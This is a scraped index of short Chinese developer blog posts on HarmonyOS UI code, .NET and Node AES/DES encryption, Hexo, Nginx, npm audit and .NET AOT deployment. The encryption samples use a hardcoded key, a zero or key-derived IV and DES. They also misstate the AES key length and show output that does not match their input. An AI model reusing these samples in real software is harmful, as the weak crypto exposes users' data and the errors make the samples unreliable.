$r(\u0026#39;app.media.11\u0026#39;), $r(\u0026#39;app.media.33\u0026#39;), $r(\u0026#39;app.media.44\u0026#39;), $r(\u0026#39;app.media.11\u0026#39;)] , [ $r(\u0026#39;app.media.33\u0026#39;), $r(\u0026#39;app.media.11\u0026#39;), $r(\u0026#39;app.media.33\u0026#39;), $r(\u0026#39;app.media.44\u0026#39;), $r(\u0026#39;app.media.11\u0026#39;)] ] // ForEach(coms.IMGLIST,(item:Array\u0026lt; Resource\u0026gt;,index?:Number)=\u0026gt;{ GridItem(){ Column(){ Image(item[0]) .borderRadius(2) .aspectRatio(1.6) .borderRadius(\u0026#39;5vp\u0026#39;) .margin(\u0026#39;5vp\u0026#39;) // .padding(\u0026#39;5vp\u0026#39;) } } 🎈pagelist p2 router P2\n.onClick(()=\u0026gt;{ router.pushUrl({ url:\u0026#39;pages/ListPage\u0026#39;, params:{ptitem:item} }) }) main_pages.js配置路由\n//ts Record item:Array\u0026lt;Resource\u0026gt; = (router.getParams() as Record\u0026lt;string, Array\u0026lt;Resource\u0026gt;\u0026gt;).item; //... Navigation(){ Grid() { ForEach(this.item,(item2: Resource,index?:Number)=\u0026gt; { GridItem() { Image(item2) .borderRadius(2) .aspectRatio(1.6) .borderRadius(\u0026#39;5vp\u0026#39;) .margin(\u0026#39;5vp\u0026#39;) // .padding(\u0026#39;5vp\u0026#39;) } }) } .columnsTemplate(\u0026#39;1fr 1fr 1fr\u0026#39;) .columnsGap(5) .rowsGap(5) .margin(\u0026#39;12vp\u0026#39;) } .title(\u0026#39;p2\u0026#39;) .hideNavBar(false) .titleMode(NavigationTitleMode.Mini) hmos里面的console.log\n//log hilog.info(0x0000,\u0026#39;image\u0026#39;,\u0026#39;abc\u0026#39;); 🪄page p3 item3:Resource = (router.getParams() as Record\u0026lt;string, Resource\u0026gt;).item3;// [] build() { Navigation(){ Image(this.item3) .borderRadius(2) .aspectRatio(1.6) .borderRadius(\u0026#39;5vp\u0026#39;) .margin(\u0026#39;5vp\u0026#39;) } .title(\u0026#39;p3\u0026#39;) .hideNavBar(false) .titleMode(NavigationTitleMode.Mini) 备注 Image组件共有以下三种声明方式： （1）string格式，通常用来加载网络图片，若部署在真实设备上，需要申请网络访问权限 Image（\u0026ldquo;URL\u0026rdquo;） （2）PixelMap格式，可以加载像素图，常用在图片编辑中 Image（pixelMapObject） （3）Resource格式，加载本地图片（推荐） Image($r(\u0026lsquo;app.media.xxx\u0026rsquo;))不需要带后缀名 地址：src/main/resources/base/media Image($rawfile(xxx.png))需要后缀，地址：src/main/resources/rawfile\nend\n","permalink":"https://qfsyso.github.io/posts/harmonyos-photos-column-swiper-grid/","summary":"​\n✨️index title swiper list(grid)\nimport coms from \u0026#39;../pages/com\u0026#39; @Entry @Component struct Index { @State message: string = \u0026#39;Hello World1\u0026#39; //private list = new con build() { Column() { //标题 Row(){ Text(\u0026#39;photos\u0026#39;) .fontSize(\u0026#39;30fp\u0026#39;) .fontWeight(FontWeight.Bold) } .justifyContent(FlexAlign.Start) .width(\u0026#39;100%\u0026#39;) .padding(\u0026#39;12vp\u0026#39;) //轮播 Swiper() { ForEach(coms.SWIPERLIST,(item:Resource,index?:Number)=\u0026gt;{ Row() { Image(item) } .width(\u0026#39;100%\u0026#39;) .aspectRatio(1.6) }) } .autoPlay(true) .loop(true) .indicator(true) .duration(1000) .itemSpace(10) .borderRadius(\u0026#39;12vp\u0026#39;) .margin(\u0026#39;12vp\u0026#39;) .onChange((index: number) =\u0026gt; { }) //列表 Grid(){ GridItem(){ Column(){ Image($r(\u0026#39;app.media.icon\u0026#39;)) .borderRadius(2) } } GridItem(){ Column(){ Image($r(\u0026#39;app.","title":"HarmonyOS Photos Column Swiper Grid"},{"content":".NET AES DES 对称加密\nASE 加密解密 加密方法 (Encrypt):\n创建一个 Aes 实例。 设置密钥 (Key) 和初始化向量 (IV)。 使用 CreateEncryptor 创建加密器。 通过 CryptoStream 和 StreamWriter 将明文写入内存流，然后转换为 Base64 字符串。\n解密方法 (Decrypt):\n同样创建一个 Aes 实例。 设置相同的密钥和初始化向量。 使用 CreateDecryptor 创建解密器。 通过 CryptoStream 和 StreamReader 从内存流读取密文并解密为明文。\n注意事项 密钥长度：AES 支持 128, 192, 和 256 位密钥。本例使用 256 位（32 字节）。 初始化向量 (IV)：应确保加密和解密时使用相同的 IV。本例中使用了全零的 IV，在实际应用中建议使用随机 IV，并将其与密文一起存储。\nusing System; using System.IO; using System.Security.Cryptography; using System.Text; class SymmetricEncryption { // 加密方法 public static string Encrypt(string plainText, string key) { using (Aes aesAlg = Aes.Create()) { aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = new byte[16]; // 初始化向量 (IV) 可以设为全零，也可以使用随机值 ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) { using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) { swEncrypt.Write(plainText); } return Convert.ToBase64String(msEncrypt.ToArray()); } } } // 解密方法 public static string Decrypt(string cipherText, string key) { using (Aes aesAlg = Aes.Create()) { aesAlg.Key = Encoding.UTF8.GetBytes(key); aesAlg.IV = new byte[16]; // 与加密时使用相同的 IV ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV); using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText))) { using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) using (StreamReader srDecrypt = new StreamReader(csDecrypt)) { return srDecrypt.ReadToEnd(); } } } } // 示例主方法 public static void Main() { string original = \u0026#34;Hello, World!\u0026#34;; string key = \u0026#34;thisisaverysecretkey1234\u0026#34;; // 32 字节的密钥 // 加密 string encrypted = Encrypt(original, key); Console.WriteLine($\u0026#34;Encrypted: {encrypted}\u0026#34;); // 解密 string decrypted = Decrypt(encrypted, key); Console.WriteLine($\u0026#34;Decrypted: {decrypted}\u0026#34;); } } Encrypted: NEVECFUqMdlFuAPGXm30FQ== Decrypted: 115\nDES 加密解密 using System; using System.IO; using System.Security.Cryptography; using System.Text; class SymmetricEncryption { // 加密方法 public static string Encrypt(string plainText, string key) { using (DES desAlg = DES.Create()) { desAlg.Key = Encoding.UTF8.GetBytes(key); desAlg.IV = Encoding.UTF8.GetBytes(key); // 使用相同的 key 作为 IV，这仅用于示例，实际应用中应使用随机 IV ICryptoTransform encryptor = desAlg.CreateEncryptor(desAlg.Key, desAlg.IV); using (MemoryStream msEncrypt = new MemoryStream()) { using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write)) using (StreamWriter swEncrypt = new StreamWriter(csEncrypt)) { swEncrypt.Write(plainText); } return Convert.ToBase64String(msEncrypt.ToArray()); } } } // 解密方法 public static string Decrypt(string cipherText, string key) { using (DES desAlg = DES.Create()) { desAlg.Key = Encoding.UTF8.GetBytes(key); desAlg.IV = Encoding.UTF8.GetBytes(key); // 使用相同的 key 作为 IV ICryptoTransform decryptor = desAlg.CreateDecryptor(desAlg.Key, desAlg.IV); using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cipherText))) { using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read)) using (StreamReader srDecrypt = new StreamReader(csDecrypt)) { return srDecrypt.ReadToEnd(); } } } } // 示例主方法 public static void Main() { string original = \u0026#34;Hello, World!\u0026#34;; string key = \u0026#34;abcdefgh\u0026#34;; // 8 字节的密钥 // 加密 string encrypted = Encrypt(original, key); Console.WriteLine($\u0026#34;Encrypted: {encrypted}\u0026#34;); // 解密 string decrypted = Decrypt(encrypted, key); Console.WriteLine($\u0026#34;Decrypted: {decrypted}\u0026#34;); } } 加密方法 (Encrypt):\n创建一个 DES 实例。 设置密钥 (Key) 和初始化向量 (IV)。这里为了简化使用相同的 key 作为 IV，但实际应用中应使用不同且随机的 IV。 使用 CreateEncryptor 创建加密器。 通过 CryptoStream 和 StreamWriter 将明文写入内存流，然后转换为 Base64 字符串。 解密方法 (Decrypt):\n同样创建一个 DES 实例。 设置相同的密钥和初始化向量。 使用 CreateDecryptor 创建解密器。 通过 CryptoStream 和 StreamReader 从内存流读取密文并解密为明文。\n主方法 (Main): 定义一个示例明文和密钥。\n调用加密和解密方法，输出结果。 注意事项 密钥长度：DES 使用 56 位密钥（即 8 字节）。本例使用了 8 字节的字符串密钥。 初始化向量 (IV)：应确保加密和解密时使用相同的 IV。本例中为了简化示例，使用了与密钥相同的 IV，实际应用中应使用随机 IV，并将其与密文一起存储。 DES 安全性：DES 已被认为不再安全，建议使用更安全的加密算法如 AES。在实际应用中尽量避免使用 DES。\n扩展 NodeJS版本\nconst crypto = require(\u0026#39;crypto\u0026#39;); // 加密函数 function encrypt(plainText, key) { const iv = Buffer.alloc(16, 0); // 初始化向量 (IV) 可以设为全零，也可以使用随机值 const cipher = crypto.createCipheriv(\u0026#39;aes-256-cbc\u0026#39;, key, iv); let encrypted = cipher.update(plainText, \u0026#39;utf8\u0026#39;, \u0026#39;base64\u0026#39;); encrypted += cipher.final(\u0026#39;base64\u0026#39;); return encrypted; } // 解密函数 function decrypt(cipherText, key) { const iv = Buffer.alloc(16, 0); // 与加密时使用相同的 IV const decipher = crypto.createDecipheriv(\u0026#39;aes-256-cbc\u0026#39;, key, iv); let decrypted = decipher.update(cipherText, \u0026#39;base64\u0026#39;, \u0026#39;utf8\u0026#39;); decrypted += decipher.final(\u0026#39;utf8\u0026#39;); return decrypted; } // 要加密的明文 const plainText = \u0026#34;115\u0026#34;; // 使用密钥加密消息 const key = crypto.createHash(\u0026#39;sha256\u0026#39;).update(\u0026#34;thisisaverysecretkey1234\u0026#34;).digest(); const encryptedText = encrypt(plainText, key); console.log(\u0026#39;Encrypted Text:\u0026#39;, encryptedText); // 使用密钥解密消息 const decryptedText = decrypt(encryptedText, key); console.log(\u0026#39;Decrypted Text:\u0026#39;, decryptedText); ","permalink":"https://qfsyso.github.io/posts/.net-aes-des/","summary":".NET AES DES 对称加密\nASE 加密解密 加密方法 (Encrypt):\n创建一个 Aes 实例。 设置密钥 (Key) 和初始化向量 (IV)。 使用 CreateEncryptor 创建加密器。 通过 CryptoStream 和 StreamWriter 将明文写入内存流，然后转换为 Base64 字符串。\n解密方法 (Decrypt):\n同样创建一个 Aes 实例。 设置相同的密钥和初始化向量。 使用 CreateDecryptor 创建解密器。 通过 CryptoStream 和 StreamReader 从内存流读取密文并解密为明文。\n注意事项 密钥长度：AES 支持 128, 192, 和 256 位密钥。本例使用 256 位（32 字节）。 初始化向量 (IV)：应确保加密和解密时使用相同的 IV。本例中使用了全零的 IV，在实际应用中建议使用随机 IV，并将其与密文一起存储。\nusing System; using System.IO; using System.Security.Cryptography; using System.Text; class SymmetricEncryption { // 加密方法 public static string Encrypt(string plainText, string key) { using (Aes aesAlg = Aes.","title":".NET AES DES"},{"content":"IOS POD\nbrew install cocoapod gem install cocoapod sudo gem install cocoapod sudo brew update ruby update rvm install 2.7 cd xx\npod install ","permalink":"https://qfsyso.github.io/posts/ios-pod/","summary":"IOS POD\nbrew install cocoapod gem install cocoapod sudo gem install cocoapod sudo brew update ruby update rvm install 2.7 cd xx\npod install ","title":"IOS POD"},{"content":"在C#中，可以使用Image类和Bitmap类来处理图像，并且可以借助Magick.NET库来将JPG图片转换为WEBP格式。\n安装Magick.NET-Q8-AnyCPU NuGet包。\nusing ImageMagick; 转换方法\npublic void ConvertJpgToWebP2(string inputFilePath, string outputFilePath) { using (var image = new MagickImage(inputFilePath)) { // 设置WEBP压缩质量，范围从0（最好的质量）到100（最快速压缩） image.Quality = 80; image.Format = MagickFormat.WebP; image.Write(outputFilePath); } } 调用\nstring jpgPath = \u0026#34;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.jpg\u0026#34;; string webpPath = \u0026#34;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.webp\u0026#34;; Ig ig = new Ig(); ig.ConvertJpgToWebP2(jpgPath, webpPath); ","permalink":"https://qfsyso.github.io/posts/.net-webp/","summary":"在C#中，可以使用Image类和Bitmap类来处理图像，并且可以借助Magick.NET库来将JPG图片转换为WEBP格式。\n安装Magick.NET-Q8-AnyCPU NuGet包。\nusing ImageMagick; 转换方法\npublic void ConvertJpgToWebP2(string inputFilePath, string outputFilePath) { using (var image = new MagickImage(inputFilePath)) { // 设置WEBP压缩质量，范围从0（最好的质量）到100（最快速压缩） image.Quality = 80; image.Format = MagickFormat.WebP; image.Write(outputFilePath); } } 调用\nstring jpgPath = \u0026#34;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.jpg\u0026#34;; string webpPath = \u0026#34;E:\\\\net8test\\\\ConsoleApp1Test\\\\ConsoleApp1Test\\\\bin\\\\Debug\\\\net8.0\\\\55.webp\u0026#34;; Ig ig = new Ig(); ig.ConvertJpgToWebP2(jpgPath, webpPath); ","title":".NET webp"},{"content":"配置categories 新建页面categories: hexo new page \u0026#34;categories\u0026#34; 执行命令后将新生成文件夹categories，并在该文件夹下生成index.md文件。\n编辑categories/index.md文件: vi {path}/source/categories/index.md 编辑内容：\n+++ title: 分类 date = \u0026#39;2017-10-25 22:00:00 type: \u0026#34;categories\u0026#34; +++ 编辑主题配置文件themes/xx/_config.yml: vi {path}/themes/xx/_config.yml 将menu中的categories的注释去掉：\nmenu: home: / || home #tags = [\u0026#34; /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 编辑文章在Front-matter区域（即+++分隔的区域）指定categories即可： +++ title: test date = \u0026#39;2017-01-01 00:00:00 categories: - 类别名称 tags = [\u0026#34; - 标签 +++ categories/index.md +++ title: 分类 date = \u0026#39;2024-05-08 22:00:00 type: \u0026#34;categories\u0026#34; +++ - [分类](/categories/) - [分类-技术](/categories/技术/) - [分类-生活](/categories/生活/) 分类具有顺序性和层次性，而标签没有顺序和层次。\n配置tags 新建页面tags = [\u0026quot; hexo new page \u0026#34;tags\u0026#34; 编辑tags/index.md文件: \u0026lt;% if (site.tags.length){ %\u0026gt; \u0026lt;aside\u0026gt; \u0026lt;div class=\u0026#34;widget\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;widget-title\u0026#34;\u0026gt;标签云\u0026lt;/h3\u0026gt; \u0026lt;div class=\u0026#34;widget-content\u0026#34;\u0026gt; \u0026lt;% site.tags.forEach(function(tag){ %\u0026gt; \u0026lt;a href=\u0026#34;\u0026lt;%= url_for(tag.path) %\u0026gt;\u0026#34; style=\u0026#34;font-size: \u0026lt;%= tag.length %\u0026gt;px;\u0026#34;\u0026gt;\u0026lt;%= tag.name %\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;% }) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/aside\u0026gt; \u0026lt;% } %\u0026gt; vi {path}/source/tags/index.md 编辑内容：\n+++ title: 标签 date = \u0026#39;2017-10-25 22:05:00 type: \u0026#34;tags\u0026#34; +++ 编辑主题配置文件themes/xx/_config.yml: vi {path}/themes/next/_config.yml 将menu中的tags的注释去掉：\nmenu: home: / || home tags = [\u0026#34; /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 文章指定tags的写法与categories一致，在Front-matter区域指定即可，写法可参考以上。\n配置about 新建页面about: hexo new page \u0026#34;about\u0026#34; 编辑about/index.md文件，内容可根据个人编写； vi {path}/source/about/index.md\n编辑主题配置文件themes/xx/_config.yml: vi {path}/themes/xx/_config.yml 将menu中的about的注释去掉：\nmenu: home: / || home tags = [\u0026#34; /tags/ || tags categories: /categories/ || th archives: /archives/ || archive about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat ","permalink":"https://qfsyso.github.io/posts/hexo-categories-tags/","summary":"配置categories 新建页面categories: hexo new page \u0026#34;categories\u0026#34; 执行命令后将新生成文件夹categories，并在该文件夹下生成index.md文件。\n编辑categories/index.md文件: vi {path}/source/categories/index.md 编辑内容：\n+++ title: 分类 date = \u0026#39;2017-10-25 22:00:00 type: \u0026#34;categories\u0026#34; +++ 编辑主题配置文件themes/xx/_config.yml: vi {path}/themes/xx/_config.yml 将menu中的categories的注释去掉：\nmenu: home: / || home #tags = [\u0026#34; /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #about: /about/ || user #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 编辑文章在Front-matter区域（即+++分隔的区域）指定categories即可： +++ title: test date = \u0026#39;2017-01-01 00:00:00 categories: - 类别名称 tags = [\u0026#34; - 标签 +++ categories/index.","title":"Hexo Categories Tags"},{"content":"WEB UVPV busuanzi 不蒜子 不蒜子是一款用于静态网站的访问计数工具，可以方便地在网页上显示访问次数。与其他统计工具如百度统计和谷歌分析不同的是，不蒜子直接将访问次数显示在网页上，而不需要用户跳转到外部平台查看。\n不蒜子的计数原理： 通过在网页中引入JavaScript脚本，将当前页面的URL或某种唯一标识注册到不蒜子的服务器上，服务器保存着URL与对应的访问计数值。当页面被访问时，通过JavaScript更新服务器上的计数值，并在页面初始化时加载并显示计数值。\n如何使用？ 在网页需要引用计数功能的地方先引入不蒜子的js\n\u0026lt;!-- 引入不蒜子计数 --\u0026gt; \u0026lt;script async src=\u0026#34;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 为了美观，我们再引入旋转花瓣加载特效\u0026quot;fa fa-spinner fa-spin\u0026quot; 总访问量计数算法：pv方式，单个用户连续点击n篇文章，记录n次访问量。 总访客数计数算法：uv方式，单个用户连续点击n篇文章，只记录1次访客数。\n\u0026lt;center\u0026gt; 浏览量：\u0026lt;span id=\u0026#34;busuanzi_value_site_pv\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-spinner fa-spin\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt;👀 | 访客数：\u0026lt;span id=\u0026#34;busuanzi_value_site_uv\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-spinner fa-spin\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt;👦 \u0026lt;/center\u0026gt; 注：美化及其他嵌入的改动，其实只要内层的span就可以，然后用css美化或者做嵌入\n","permalink":"https://qfsyso.github.io/posts/web-uvpv-busuanzi/","summary":"WEB UVPV busuanzi 不蒜子 不蒜子是一款用于静态网站的访问计数工具，可以方便地在网页上显示访问次数。与其他统计工具如百度统计和谷歌分析不同的是，不蒜子直接将访问次数显示在网页上，而不需要用户跳转到外部平台查看。\n不蒜子的计数原理： 通过在网页中引入JavaScript脚本，将当前页面的URL或某种唯一标识注册到不蒜子的服务器上，服务器保存着URL与对应的访问计数值。当页面被访问时，通过JavaScript更新服务器上的计数值，并在页面初始化时加载并显示计数值。\n如何使用？ 在网页需要引用计数功能的地方先引入不蒜子的js\n\u0026lt;!-- 引入不蒜子计数 --\u0026gt; \u0026lt;script async src=\u0026#34;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 为了美观，我们再引入旋转花瓣加载特效\u0026quot;fa fa-spinner fa-spin\u0026quot; 总访问量计数算法：pv方式，单个用户连续点击n篇文章，记录n次访问量。 总访客数计数算法：uv方式，单个用户连续点击n篇文章，只记录1次访客数。\n\u0026lt;center\u0026gt; 浏览量：\u0026lt;span id=\u0026#34;busuanzi_value_site_pv\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-spinner fa-spin\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt;👀 | 访客数：\u0026lt;span id=\u0026#34;busuanzi_value_site_uv\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fa fa-spinner fa-spin\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/span\u0026gt;👦 \u0026lt;/center\u0026gt; 注：美化及其他嵌入的改动，其实只要内层的span就可以，然后用css美化或者做嵌入","title":" Web uvpv busuanzi"},{"content":"11 packages are looking for funding run npm fund for details\n6 vulnerabilities (4 high, 2 critical)\nTo address issues that do not require attention, run: npm audit fix\nTo address all issues, run: npm audit fix \u0026ndash;force\nRun npm audit for details.\n————————————————\n这个报错信息的意思是：\n依赖包已经是最新的，npm检查了xx个包，花了x秒钟。 有x个包正在寻求资金支持，运行npm fund来查看详情，也可以选择捐赠一些钱给这些包的开发者。 有x个中等程度的安全漏洞，运行npm audit fix \u0026ndash;force来修复所有的问题，包括一些可能导致破坏性变化的问题。 运行npm audit来查看更多的细节，包括每个漏洞的类型，来源，影响等。\n解决方法\n有时候并不想修复这些安全漏洞，因为它们可能会影响我们的项目的正常运行，或者我们只是想快速地初始化一个项目，不想被这些报错信息打扰,可以使用一个简单的命令来关闭npm的audit检查： npm set audit false 这样就可以保证npm的audit不会影响初始化项目，但是这个解决办法并不建议使用在实际生产中，因为它会让我们忽略一些可能存在的安全风险。 同样的，可以将值设为true来打开npm audit检查，这样可以看到npm的报错信息，也可以选择修复它们： npm set audit true 这个操作将对全局生效，也就是说，它会影响我们所有的项目，不管是新的还是旧的。\n修复~但不是破坏性修复\nnpm audit fix ","permalink":"https://qfsyso.github.io/posts/npm-audit/","summary":"11 packages are looking for funding run npm fund for details\n6 vulnerabilities (4 high, 2 critical)\nTo address issues that do not require attention, run: npm audit fix\nTo address all issues, run: npm audit fix \u0026ndash;force\nRun npm audit for details.\n————————————————\n这个报错信息的意思是：\n依赖包已经是最新的，npm检查了xx个包，花了x秒钟。 有x个包正在寻求资金支持，运行npm fund来查看详情，也可以选择捐赠一些钱给这些包的开发者。 有x个中等程度的安全漏洞，运行npm audit fix \u0026ndash;force来修复所有的问题，包括一些可能导致破坏性变化的问题。 运行npm audit来查看更多的细节，包括每个漏洞的类型，来源，影响等。\n解决方法\n有时候并不想修复这些安全漏洞，因为它们可能会影响我们的项目的正常运行，或者我们只是想快速地初始化一个项目，不想被这些报错信息打扰,可以使用一个简单的命令来关闭npm的audit检查： npm set audit false 这样就可以保证npm的audit不会影响初始化项目，但是这个解决办法并不建议使用在实际生产中，因为它会让我们忽略一些可能存在的安全风险。 同样的，可以将值设为true来打开npm audit检查，这样可以看到npm的报错信息，也可以选择修复它们： npm set audit true 这个操作将对全局生效，也就是说，它会影响我们所有的项目，不管是新的还是旧的。\n修复~但不是破坏性修复\nnpm audit fix ","title":"npm audit"},{"content":"前言 .NET8对于性能的优化是方方面面的，所以AOT预编译机器码也是不例外的。本篇来看下对于AOT的优化。\n概述 首先要明确一个概念，.NET里面的AOT它是原生的。什么意思呢？也就是说通过ILC编译器(AOT编译器，编译出来的代码是各个平台上可以直接运行的二进制代码。比如MacOS的二进制，Linux二进制等等。所以称之为原生。\nC#源码被ILC编译之后，生成了一个完全原生态代码的可执行文件。在执行的时候不需要JIT来编译任何东西，因为JIT已经在ILC里面被充分利用过了。实际上AOT里面也没有包含JIT。那么它如何优化呢？只能是在ILC里面调用JIT的时候了。所以它这个优化依然依靠JIT。.NET8里面优化AOT的一个典型的例子，就是ASP.NET应用程序在使用AOT的时候表现不错，同时也降低了总成本。\n创建项目 启用AOT\n打包指令 dotnet publish DemoAot.csproj -o pub\\ -c Release -r win-x64 linux下 先安装SDK 安装后\ndotnet --list-sdks dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r linux-x64 macos下 安装SDK后\ndotnet --list-sdks dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r osx-x64 重启服务器 通过命令 cd fser 及sudo nohup /root/fser/fileserver \u0026gt; output{当前时间}.log 2\u0026gt;\u0026amp;1 \u0026amp; 和命令 cd nets4 及sudo nohup dotnet /root/nets4/IM.dll \u0026gt; output{当前时间}.log 2\u0026gt;\u0026amp;1 \u0026amp; 自动化运行\n为了自动化运行这些程序启动命令，可以编写一个 Shell 脚本并结合系统启动服务（如 systemd）来执行。 以下是具体实现步骤：\n1. 创建 Shell 脚本 编写一个脚本，比如命名为 start_services.sh：\n#!/bin/bash # 获取当前时间作为日志文件名的一部分 current_time=$(date +\u0026#34;%Y-%m-%d_%H-%M-%S\u0026#34;) # 启动 fileserver 程序 cd /root/fser || exit sudo nohup /root/fser/fileserver \u0026gt; \u0026#34;output_${current_time}.log\u0026#34; 2\u0026gt;\u0026amp;1 \u0026amp; # 启动 IM.dll 程序 cd /root/nets4 || exit sudo nohup dotnet /root/nets4/IM.dll \u0026gt; \u0026#34;output_${current_time}.log\u0026#34; 2\u0026gt;\u0026amp;1 \u0026amp; echo \u0026#34;Services started successfully at ${current_time}. 脚本说明： current_time=$(date +\u0026quot;%Y-%m-%d_%H-%M-%S\u0026quot;) 用于生成当前时间的字符串。 每个启动命令都包含 cd 到目标目录后运行程序，并将日志文件命名为包含时间戳的文件。 使用 || exit 确保如果 cd 失败，脚本会中断。\n2. 赋予脚本执行权限 运行以下命令为脚本赋予可执行权限：\nchmod +x start_services.sh 3. 自动化执行 使用 systemd 配置服务 如果需要在系统重启时自动启动，可以配置 systemd 服务文件：\n创建服务文件 在 /etc/systemd/system/ 目录下创建一个服务文件，比如 my_services.service：\nini [Unit] Description=Start Custom Services After=network.target [Service] Type=simple ExecStart=/path/to/start_services.sh Restart=on-failure [Install] WantedBy=multi-user.target 启动并启用服务\nsudo systemctl daemon-reload sudo systemctl start my_services.service sudo systemctl enable my_services.service 以上步骤可以满足你在重启服务器时自动启动程序的需求。推荐使用 systemd 方法服务管理方式，提供了监控和自动重启功能。\n","permalink":"https://qfsyso.github.io/posts/.net-native-aot/","summary":"前言 .NET8对于性能的优化是方方面面的，所以AOT预编译机器码也是不例外的。本篇来看下对于AOT的优化。\n概述 首先要明确一个概念，.NET里面的AOT它是原生的。什么意思呢？也就是说通过ILC编译器(AOT编译器，编译出来的代码是各个平台上可以直接运行的二进制代码。比如MacOS的二进制，Linux二进制等等。所以称之为原生。\nC#源码被ILC编译之后，生成了一个完全原生态代码的可执行文件。在执行的时候不需要JIT来编译任何东西，因为JIT已经在ILC里面被充分利用过了。实际上AOT里面也没有包含JIT。那么它如何优化呢？只能是在ILC里面调用JIT的时候了。所以它这个优化依然依靠JIT。.NET8里面优化AOT的一个典型的例子，就是ASP.NET应用程序在使用AOT的时候表现不错，同时也降低了总成本。\n创建项目 启用AOT\n打包指令 dotnet publish DemoAot.csproj -o pub\\ -c Release -r win-x64 linux下 先安装SDK 安装后\ndotnet --list-sdks dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r linux-x64 macos下 安装SDK后\ndotnet --list-sdks dotnet publish DemoAot.csproj -o $PWD/pub -c Release -r osx-x64 重启服务器 通过命令 cd fser 及sudo nohup /root/fser/fileserver \u0026gt; output{当前时间}.log 2\u0026gt;\u0026amp;1 \u0026amp; 和命令 cd nets4 及sudo nohup dotnet /root/nets4/IM.dll \u0026gt; output{当前时间}.log 2\u0026gt;\u0026amp;1 \u0026amp; 自动化运行\n为了自动化运行这些程序启动命令，可以编写一个 Shell 脚本并结合系统启动服务（如 systemd）来执行。 以下是具体实现步骤：","title":".NET native AOT"},{"content":"debian安装 nginx 在Debian系统上安装Nginx，可以按照以下步骤操作：\n如果 sudo: command not found\napt-get install sudo 首先，更新的包索引：\nsudo apt update 接下来，安装Nginx：\nsudo apt install nginx 安装完成后，启动Nginx服务：\nsudo systemctl start nginx （可选）设置Nginx开机自启动：\nsudo systemctl enable nginx 可以通过运行以下命令来检查Nginx的状态：\nsudo systemctl status nginx 现在，可以在Web浏览器中输入服务器的IP地址或域名来访问默认的Nginx欢迎页面。如果是在本地安装的Nginx，可以通过访问 http://localhost 来查看这个页面。\n如果需要配置Nginx，可以编辑 /etc/nginx/nginx.conf 文件或者在 /etc/nginx/sites-available/ 目录下创建或编辑配置文件，并使用 sudo ln -s /etc/nginx/sites-available/your-config /etc/nginx/sites-enabled/ 命令来启用它。\nsudo whereis nginx Nginx 默认安装位置 配置文件所在目录 /etc/\nnginx配置 检测Nginx配置文件是否正确\nnginx -t 重载Nginx配置\nnginx -s reload 自定义Nginx站点配置文件存放目录 /etc/nginx/conf.d/\nnginx网站目录 /var/www/\n域名证书\n阿里云证书 免费证书 https://help.aliyun.com/zh/ssl-certificate/user-guide/overview-of-free-certificates-overview-of-free-certificates https://yundun.console.aliyun.com/?p=cas#/certExtend/free/cn-hangzhou\n服务器类型 Nginx Tomcat Apache ls JKS 其他\n根证书下载 证书格式 pem/key pfx crt/key pfx jks pem/key crt/cer\nNginx部署 https://help.aliyun.com/zh/ssl-certificate/user-guide/install-ssl-certificates-on-nginx-servers-or-tengine-servers?\nls /root/cerf/www.dtso.net.pem\nnginx -s reload #重新载入配置文件。 说明 报错the \u0026ldquo;ssl\u0026rdquo; parameter requires ngx_http_ssl_module：您需要重新编译Nginx并在编译安装的时候加上\u0026ndash;with-http_ssl_module配置。\n报错\u0026quot;/cert/3970497_demo.aliyundoc.com.pem\u0026quot;:BIO_new_file() failed (SSL: error:02001002:system library:fopen:No such file or directory:fopen(\u0026rsquo;/cert/3970497_demo.aliyundoc.com.pem\u0026rsquo;,\u0026lsquo;r\u0026rsquo;) 